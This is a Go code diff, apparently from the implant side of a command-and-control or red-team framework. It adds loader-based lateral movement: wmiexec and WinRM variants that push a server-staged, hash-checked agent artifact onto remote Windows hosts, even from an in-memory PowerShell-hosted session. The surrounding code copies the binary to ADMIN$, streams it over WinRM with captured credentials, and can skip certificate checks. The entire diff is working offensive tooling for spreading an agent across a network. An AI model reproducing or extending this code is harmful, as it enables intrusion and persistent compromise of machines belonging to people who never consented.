@@ -33,10 +33,17 @@ type lateralPayload struct {
 	WorkspaceID    *string `json:"workspace_id,omitempty"`
 	RemoteName     string  `json:"remote_name"`
 	Stage          string  `json:"stage"`
+	Loader         string  `json:"loader,omitempty"`
+	PayloadSHA256  string  `json:"payload_sha256,omitempty"`
 	TimeoutSeconds float64 `json:"timeout_seconds"`
 	HTTPS          bool    `json:"https,omitempty"`
 	Insecure       bool    `json:"insecure,omitempty"`
 	winrmIdentity  *winrmCredentials
+	// loaderDeploy marks the server-sourced deployment chain: the agent
+	// artifact bytes come from the staging endpoint instead of this
+	// process's own binary, so the source session's hosting mode is
+	// irrelevant to the deployment.
+	loaderDeploy bool
 }
 
 var lateralMethods = map[string]bool{
@@ -44,6 +51,15 @@ var lateralMethods = map[string]bool{
 	"wmiexec": true,
 	"winrm":   true,
 }
+
+// lateralSHA256Pattern matches the lowercase hex digest the server records
+// for the staged deployment artifact.
+var lateralSHA256Pattern = regexp.MustCompile(`^[a-f0-9]{64}$`)
+
+// errLoaderReserved rejects the PowerShell loader implementation, reserved on
+// every surface for a later release. The failure is explicit so an operator
+// never mistakes it for a silently substituted csharp deployment.
+var errLoaderReserved = errors.New("loader powershell is reserved and not supported in this release; use loader csharp")
 
 // lateralHostIsIP reports whether a lateral target is an IP literal rather
 // than a DNS name. WMI selects NTLM for IP literals and Kerberos for DNS
@@ -73,6 +89,17 @@ var errMemoryHosted = errors.New("this session is loaded in memory; the operatio
 // memoryHosted reports whether this instance runs inside its loader host.
 func memoryHosted() bool {
 	return os.Getenv(memoryHostedEnv) == "1"
+}
+
+// lateralUsesSelfBinary reports whether a lateral method depends on this
+// process's own binary. Legacy wmiexec copies it to ADMIN$, legacy winrm
+// streams it, and the psexec cleanup retry re-executes it. Loader
+// deployments instead stream a server-staged artifact, so a memory-hosted
+// source may run them: guarding on the dependency instead of the hosting
+// mode keeps the deployment valid wherever the artifact comes from the
+// server instead of this binary.
+func lateralUsesSelfBinary(payload lateralPayload) bool {
+	return !payload.loaderDeploy
 }
 
 // awaitLateralResult preserves acknowledged artifacts when the command expires.
@@ -166,6 +193,28 @@ func parseLateralPayload(command string) (lateralPayload, error) {
 		}
 		payload.Method, payload.HTTPS, payload.Insecure = "winrm", true, true
 	}
+	// Loader deployments use their own wire-method names for the same reason
+	// as HTTPS: an older agent must reject the request instead of ignoring
+	// the new fields and silently deploying a copy of its own binary.
+	switch payload.Method {
+	case "wmiexec_loader":
+		payload.Method, payload.loaderDeploy = "wmiexec", true
+	case "winrm_loader":
+		if payload.HTTPS {
+			return payload, errors.New("https belongs to the winrm_https_loader wire method")
+		}
+		payload.Method, payload.loaderDeploy = "winrm", true
+	case "winrm_https_loader":
+		if payload.Insecure {
+			return payload, errors.New("insecure belongs to the winrm_https_insecure_loader wire method")
+		}
+		payload.Method, payload.HTTPS, payload.loaderDeploy = "winrm", true, true
+	case "winrm_https_insecure_loader":
+		if len(transport.Insecure) != 0 && !payload.Insecure {
+			return payload, errors.New("insecure wire method conflicts with certificate validation")
+		}
+		payload.Method, payload.HTTPS, payload.Insecure, payload.loaderDeploy = "winrm", true, true, true
+	}
 	payload.Host = strings.Trim(strings.TrimSpace(payload.Host), `\`)
 	payload.RemoteName = strings.TrimSpace(payload.RemoteName)
 	if payload.RemoteName == "" {
@@ -196,6 +245,30 @@ func parseLateralPayload(command string) (lateralPayload, error) {
 		if !agentSessionIDPattern.MatchString(payload.Stage) {
 			return payload, errors.New("psexec requires a staging reference from the listener")
 		}
+	}
+	// The single-loader release accepts only csharp; powershell stays a
+	// reserved value so later releases can ship it without changing the
+	// command shape.
+	payload.Loader = strings.ToLower(strings.TrimSpace(payload.Loader))
+	switch payload.Loader {
+	case "":
+		payload.Loader = "csharp"
+	case "csharp":
+	default:
+		if payload.Loader == "powershell" {
+			return payload, errLoaderReserved
+		}
+		return payload, errors.New("loader must be csharp (powershell is reserved)")
+	}
+	if payload.loaderDeploy {
+		if !agentSessionIDPattern.MatchString(payload.Stage) {
+			return payload, errors.New("loader deployment requires a staging reference from the listener")
+		}
+		if !lateralSHA256Pattern.MatchString(payload.PayloadSHA256) {
+			return payload, errors.New("loader deployment requires the staged payload SHA-256")
+		}
+	} else if payload.PayloadSHA256 != "" {
+		return payload, errors.New("payload_sha256 requires a loader deployment method")
 	}
 	if !lateralRemoteNamePattern.MatchString(payload.RemoteName) {
 		return payload, errors.New("remote_name must be a simple .exe filename")
@@ -323,6 +396,13 @@ func lateralCleanupCommand(command string) (string, error) {
 	}
 	if !ownsLateralCleanup(payload) {
 		return "", errors.New("cleanup artifacts are not owned by an acknowledged deployment in this agent process")
+	}
+	// The cleanup retry runs in a child of this binary. An in-memory host
+	// cannot own psexec artifacts in this release because legacy lateral
+	// methods keep refusing from its PowerShell host, but guard explicitly:
+	// re-executing os.Executable() here would relaunch powershell.exe.
+	if memoryHosted() {
+		return "", errMemoryHosted
 	}
 	self, err := os.Executable()
 	if err != nil {
